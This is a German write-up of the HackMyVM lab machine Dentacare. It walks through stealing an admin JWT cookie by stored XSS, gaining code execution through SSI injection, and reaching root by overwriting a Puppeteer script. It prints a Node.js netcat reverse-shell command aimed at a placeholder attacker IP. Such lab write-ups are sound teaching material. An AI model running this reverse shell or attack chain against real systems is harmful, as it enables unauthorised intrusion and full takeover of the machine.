# Dentacare - HackMyVM (Medium)

![Dentacare.png](Dentacare.png)

## Übersicht

*   **VM:** Dentacare
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Dentacare)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 06. August 2024
*   **Original-Writeup:** https://alientec1908.github.io/Dentacare_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser "Medium"-Challenge war es, Root-Zugriff auf der Maschine "Dentacare" zu erlangen. Die Enumeration deckte einen Python/Werkzeug-Webserver (Port 80) und einen Apache-Server (Port 8000) auf. Obwohl die Werkzeug-Debug-Konsole unter `/console` gefunden wurde, fokussierte sich der Angriff auf eine Stored XSS-Schwachstelle (vermutlich in einer Kommentarfunktion), um den JWT-Admin-Cookie zu stehlen. Mit diesem Cookie wurde Zugriff auf den Apache-Server (Port 8000) erlangt. Dort ermöglichte eine Server-Side Include (SSI) Injection RCE als Benutzer `www-data`. Die Privilegieneskalation zu Root erfolgte durch Manipulation eines Node.js-Skripts (`/opt/appli/.config/read_comment.js`), das `puppeteer` verwendete und regelmäßig (vermutlich als Root und mit der Option `--no-sandbox`) ausgeführt wurde. Durch Überschreiben dieses Skripts mit einer Reverse-Shell-Payload wurde eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `wfuzz`
*   `sqlmap` (Versuch, nicht erfolgreich)
*   `python3` (für `http.server` und Skripte zur PIN-Berechnung)
*   Browser mit Cookie-Editor (oder Burp Suite)
*   `jwt.io` (zur JWT-Analyse)
*   `nc` (netcat)
*   Node.js (`child_process`, `puppeteer` auf Zielsystem)
*   Standard Linux-Befehle (`vi`, `curl`, `stty`, `cp`, `echo`, `cat`, `ls`, `cd`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Dentacare" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mittels `arp-scan` (Ziel: `192.168.2.114`, Hostname `dentacare.hmv`).
    *   `nmap`-Scan identifizierte SSH (22/tcp), einen Python/Werkzeug-Webserver (80/tcp) und einen Apache-Server (8000/tcp, 403 Forbidden).
    *   `nikto` und `gobuster` auf Port 80 fanden Standardseiten sowie `/contact` (500 Error), `/admin` (Redirect) und `/comment` (405 Method Not Allowed).
    *   SQL-Injection-Versuche mit `sqlmap` waren erfolglos.
    *   Die Werkzeug-Debug-Konsole wurde unter `/console` gefunden, aber durch eine PIN gesperrt. (Ein PIN-Berechnungsskript wurde gezeigt, aber der Weg über XSS wurde weiterverfolgt).

2.  **XSS, JWT Hijacking & Admin Access:**
    *   Ein Stored XSS-Payload (``) wurde (vermutlich über `/comment`) injiziert.
    *   Ein Python-HTTP-Server wurde gestartet, um den via XSS exfiltrierten Cookie (`document.cookie`) zu empfangen.
    *   Der gestohlene Cookie (`Authorization=eyJ...`) wurde als JWT identifiziert. `jwt.io` zeigte, dass der Token einem Administrator (`admin@dentacare.hmv`) gehörte.
    *   Der gestohlene Admin-JWT wurde mit einem Cookie-Editor im Browser gesetzt. Der Zugriff auf `/admin` leitete nun auf `http://dentacare.hmv:8000/` um.

3.  **SSI RCE & Low Privilege Shell (als www-data):**
    *   Auf der Anwendung unter Port 8000 (Apache) wurde ein Formular gefunden, das Benutzereingaben (`cmd`-Parameter) in eine `.shtml`-Datei (`patient_name.shtml`) schrieb.
    *   Eine SSI-Injection-Schwachstelle wurde durch Eingabe von `` bestätigt.
    *   Eine SSI-Payload (``) wurde injiziert, um eine Reverse Shell zu einem Netcat-Listener zu starten.
    *   Erfolgreicher Shell-Zugriff als Benutzer `www-data`.

4.  **Privilege Escalation (von `www-data` zu `root` via Puppeteer Script Hijacking):**
    *   Als `www-data` wurde das Node.js-Skript `/opt/appli/.config/read_comment.js` gefunden.
    *   Dieses Skript verwendete `puppeteer` (mit `--no-sandbox` Option) und den zuvor gestohlenen Admin-JWT, um `localhost:80/view-all-comments` zu besuchen. Es wurde angenommen, dass dieses Skript regelmäßig mit erhöhten Rechten (vermutlich `root`) ausgeführt wird.
    *   Da `www-data` (vermutlich) Schreibrechte auf das Skript hatte, wurde es mit einem Node.js-Reverse-Shell-Payload (`require("child_process").exec("nc -e /bin/bash [Angreifer-IP] 2345")`) überschrieben.
    *   Ein Netcat-Listener wurde auf Port 2345 gestartet. Kurz darauf verband sich eine Shell als `root`.
    *   Die User- und Root-Flags wurden gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Werkzeug Debug Console Exposure:** Obwohl nicht direkt im Hauptangriffspfad genutzt, stellte die erreichbare `/console` ein potenzielles Risiko dar.
*   **Stored Cross-Site Scripting (XSS):** Ermöglichte den Diebstahl des Admin-JWT-Cookies.
*   **Unsichere Session-Cookies (JWT):** Der Admin-Cookie war nicht ausreichend gegen Diebstahl (z.B. durch fehlendes `HttpOnly`-Flag) geschützt.
*   **Server-Side Include (SSI) Injection:** Erlaubte Remote Code Execution auf dem Apache-Server (Port 8000).
*   **Unsichere Konfiguration von automatisierten Skripts (Puppeteer):** Ein als `root` (oder mit hohen Rechten) und mit `--no-sandbox` laufendes Puppeteer-Skript, das von einem weniger privilegierten Benutzer (`www-data`) modifiziert werden konnte, führte zur Root-Eskalation.
*   **Fehlende Dateiberechtigungen:** Das Puppeteer-Skript hatte unzureichende Berechtigungen.

## Flags

*   **User Flag (`/home/dentist/user.txt`):** `ef2f3bab2950c28547e17d32f864f172`
*   **Root Flag (`/root/r00t.txt`):** `31b80e67e233ed342639f36b10ecb64d`

## Tags

`HackMyVM`, `Dentacare`, `Medium`, `Web`, `Python`, `Werkzeug`, `Apache`, `XSS`, `JWT Hijacking`, `SSI Injection`, `RCE`, `Node.js`, `Puppeteer`, `Script Hijacking`, `Privilege Escalation`, `Linux`
